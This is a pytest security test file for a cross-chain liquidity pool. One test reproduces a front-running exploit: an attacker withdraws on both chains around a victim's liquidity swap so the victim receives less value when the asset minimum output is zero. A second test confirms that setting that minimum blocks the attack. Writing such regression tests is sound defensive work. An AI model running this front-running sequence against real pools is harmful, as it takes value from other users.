import pytest
from brownie import convert, reverts, chain
from brownie.exceptions import VirtualMachineError
from decimal import Decimal
from math import log, exp
from utils.common_utils import convert_64_bytes_address


pytestmark = pytest.mark.usefixtures("group_finish_setup", "group_connect_pools")

@pytest.mark.no_call_coverage
def test_circumvent_minout(
    channel_id,
    pool_1,
    pool_2,
    pool_1_tokens,
    pool_2_tokens,
    get_pool_1_amp,
    ibc_emulator,
    cross_chain_interface,
    deployer,
    berg,
    elwood
):
    """
        This exploit focuses on an implementation detail surrounding liquidity swaps.
        By depositing before liquidity swapping, the total supply increases and the 
        number of units returned for pool tokens decreases. The user can protect against
        this by setting a minimum outout. However, if this minimum output is in pool tokens
        someone can frontrun on the destination side to increase the number of pool
        tokens returned.
    """
    if get_pool_1_amp() != 10**18:
        pytest.skip("The correct multiplier value for amplified pools hasn't been found")

    # First we check what a normal liquidity swap returns:
    
    # Set the amount
    swap_amount = pool_1.totalSupply()/10
    pool_1.transfer(berg, swap_amount, {'from': deployer})
    
    
    if get_pool_1_amp() != 10**18:
        pytest.skip("reference amount is not implemented for stable coin pools.")
    # Calculate the refernece asset.
    ## Calculate the expected number of pool tokens.
    U = log(pool_1.totalSupply()/(pool_1.totalSupply() - swap_amount)) * sum([pool_1._weight(token) for token in pool_1_tokens])
    intermediate = exp(-U / sum([pool_2._weight(token) for token in pool_2_tokens]))
    pt_out = (1-intermediate)/intermediate * 10**18
    
    asset_reference_amount = exp(
        sum(
            [log(token.balanceOf(pool_2))*pool_2._weight(token) for token in pool_2_tokens]
        )/sum([pool_2._weight(token) for token in pool_2_tokens])
        )
    asset_reference_amount = int((asset_reference_amount * pt_out) / (pool_2.totalSupply() + pt_out))
    
    # Do the liquidity swap.
    tx = pool_1.sendLiquidity(
        channel_id,
        convert_64_bytes_address(pool_2.address),
        convert_64_bytes_address(berg.address),
        swap_amount,
        [int(pt_out*0.999), int(asset_reference_amount*0.999)],
        berg,
        {"from": berg},
    )
    
    # Save the unit output.
    output_units_1 = tx.return_value
    
    # Execute the transaction.
    tx_execute = ibc_emulator.execute(tx.events["IncomingMetadata"]["metadata"][0], tx.events["IncomingPacket"]["packet"], {"from": berg})
    
    # Save the number of pool tokens minted as a reference amount.
    reference_pool_tokens = pool_2.balanceOf(berg)

    # Compute the value of the pool tokens in an equal withdrawal.
    output_tokens = pool_2.withdrawAll(reference_pool_tokens, [0, 0, 0], {'from': berg}).return_value
    
    chain.undo(3)
    
    # Execute the exploit. The chain has been reset.
    
    # Set the exploit amount.
    exploit_amount = pool_1.totalSupply()/10
    pool_1.transfer(elwood, exploit_amount, {'from': deployer})
    
    # The sendLiquidity is front-run by withdrawAll. This increases the number of units minted.
    exploit_withdrawal = pool_1.withdrawAll(exploit_amount, [0, 0, 0], {'from': elwood})
    
    # Approval are set for a later deposit.
    for (token, amount) in zip(pool_1_tokens, exploit_withdrawal.return_value):
        token.approve(pool_1, amount, {'from': elwood})
    
    # User does the liquidity swap.
    tx = pool_1.sendLiquidity(
        channel_id,
        convert_64_bytes_address(pool_2.address),
        convert_64_bytes_address(berg.address),
        swap_amount,
        [int(pt_out*0.999), 0],   # ! HERE, 0 should be int(asset_reference_amount*0.999)
        berg,
        {"from": berg},
    )
    # Get the ouput units.
    output_units_2 = tx.return_value
    # Assert the exploit condition after swap.
    assert output_units_1 < output_units_2
    
    # Set the exploit amount on the other chain.
    multiplier = 1.1 if get_pool_1_amp() == 10**18 else NotImplementedError
    exploit_2_amount = exploit_amount*multiplier
    pool_2.transfer(elwood, exploit_2_amount, {'from': deployer})
    elwood_withdrawal = pool_2.withdrawAll(exploit_2_amount, [0, 0, 0], {'from': elwood})
    for (token, amount) in zip(pool_2_tokens, elwood_withdrawal.return_value):
        token.approve(pool_2, amount, {'from': elwood})
    
    # Let the liquidity swap arrive. Since there are less pool tokens in the target pool, less pool tokens are minted. To compensate for this, more units were originally sent.
    # However, each of these new pool tokens are worth less than originally.
    tx_execute = ibc_emulator.execute(tx.events["IncomingMetadata"]["metadata"][0], tx.events["IncomingPacket"]["packet"], {"from": berg})
    
    # Ack so we can work on the sending chain.
    txe = ibc_emulator.ack(
        tx.events["IncomingMetadata"]["metadata"][0],
        tx_execute.events["Acknowledgement"]["acknowledgement"],
        tx.events["IncomingPacket"]["packet"],
        {"from": deployer},
    )

    # Check swap results.
    after_exploit_pool_tokens = pool_2.balanceOf(berg)
    after_exploit_output_tokens = pool_2.withdrawAll(after_exploit_pool_tokens, [0, 0, 0], {'from': berg}).return_value
    
    for reference, under_exploit in zip(output_tokens, after_exploit_output_tokens):
        if reference + under_exploit == 0:
            continue
        assert reference > under_exploit, "Exploit didn't work"


@pytest.mark.no_call_coverage
def test_circumvent_minout_is_fixed(
    channel_id,
    pool_1,
    pool_2,
    pool_1_tokens,
    pool_2_tokens,
    get_pool_1_amp,
    ibc_emulator,
    cross_chain_interface,
    deployer,
    berg,
    elwood
):
    """
        This exploit focuses on an implementation detail surrounding liquidity swaps.
        By depositing before liquidity swapping, the total supply increases and the 
        number of units returned for pool tokens decreases. The user can protect against
        this by setting a minimum outout. However, if this minimum output is in pool tokens
        someone can frontrun on the destination side to increase the number of pool
        tokens returned.
    """
    if get_pool_1_amp() != 10**18:
        pytest.skip("The correct multiplier value for amplified pools hasn't been found")

    # First we check what a normal liquidity swap returns:
    
    # Set the amount
    swap_amount = pool_1.totalSupply()/10
    pool_1.transfer(berg, swap_amount, {'from': deployer})
    
    
    if get_pool_1_amp() != 10**18:
        pytest.skip("reference amount is not implemented for stable coin pools.")
    # Calculate the refernece asset.
    ## Calculate the expected number of pool tokens.
    U = log(pool_1.totalSupply()/(pool_1.totalSupply() - swap_amount)) * sum([pool_1._weight(token) for token in pool_1_tokens])
    intermediate = exp(-U / sum([pool_2._weight(token) for token in pool_2_tokens]))
    pt_out = (1-intermediate)/intermediate * 10**18
    
    asset_reference_amount = exp(
        sum(
            [log(token.balanceOf(pool_2))*pool_2._weight(token) for token in pool_2_tokens]
        )/sum([pool_2._weight(token) for token in pool_2_tokens])
        )
    asset_reference_amount = int((asset_reference_amount * pt_out) / (pool_2.totalSupply() + pt_out))
    
    # Do the liquidity swap.
    tx = pool_1.sendLiquidity(
        channel_id,
        convert_64_bytes_address(pool_2.address),
        convert_64_bytes_address(berg.address),
        swap_amount,
        [int(pt_out*0.999), int(asset_reference_amount*0.999)],
        berg,
        {"from": berg},
    )
    
    # Save the unit output.
    output_units_1 = tx.return_value
    
    # Execute the transaction.
    tx_execute = ibc_emulator.execute(tx.events["IncomingMetadata"]["metadata"][0], tx.events["IncomingPacket"]["packet"], {"from": berg})
    
    # Save the number of pool tokens minted as a reference amount.
    reference_pool_tokens = pool_2.balanceOf(berg)

    # Compute the value of the pool tokens in an equal withdrawal.
    output_tokens = pool_2.withdrawAll(reference_pool_tokens, [0, 0, 0], {'from': berg}).return_value
    
    chain.undo(3)
    
    # Execute the exploit. The chain has been reset.
    
    # Set the exploit amount.
    exploit_amount = pool_1.totalSupply()/10
    pool_1.transfer(elwood, exploit_amount, {'from': deployer})
    
    # The sendLiquidity is front-ran by a liquidity swap. This increases the number of units minted.
    exploit_withdrawal = pool_1.withdrawAll(exploit_amount, [0, 0, 0], {'from': elwood})
    
    # Approval are set for a later deposit.
    for (token, amount) in zip(pool_1_tokens, exploit_withdrawal.return_value):
        token.approve(pool_1, amount, {'from': elwood})
    
    # User does the liquidity swap.
    tx = pool_1.sendLiquidity(
        channel_id,
        convert_64_bytes_address(pool_2.address),
        convert_64_bytes_address(berg.address),
        swap_amount,
        [int(pt_out*0.999), int(asset_reference_amount*0.999)],
        berg,
        {"from": berg},
    )
    # Get the ouput units.
    output_units_2 = tx.return_value
    # Assert the exploit condition after swap.
    assert output_units_1 < output_units_2
    
    # Set the exploit amount on the other chain.
    multiplier = 1.1 if get_pool_1_amp() == 10**18 else NotImplementedError
    exploit_2_amount = exploit_amount*multiplier
    pool_2.transfer(elwood, exploit_2_amount, {'from': deployer})
    elwood_withdrawal = pool_2.withdrawAll(exploit_2_amount, [0, 0, 0], {'from': elwood})
    for (token, amount) in zip(pool_2_tokens, elwood_withdrawal.return_value):
        token.approve(pool_2, amount, {'from': elwood})
    
    # Let the liquidity swap arrive. Since there are less pool tokens in the target pool, less pool tokens are minted. To compensate for this, more units were originally sent.
    # However, each of these new pool tokens are worth less than originally.
    # Because the minout is set, there should be no w
    
    tx_execute = ibc_emulator.execute(tx.events["IncomingMetadata"]["metadata"][0], tx.events["IncomingPacket"]["packet"], {"from": berg})
    # Check that the transaction acks on fail.
    assert tx_execute.events["Acknowledgement"]["acknowledgement"] == hex(1)
    
    # Ensure no tokens are transfered.
    assert "Transfer" not in tx_execute.events.keys()
    
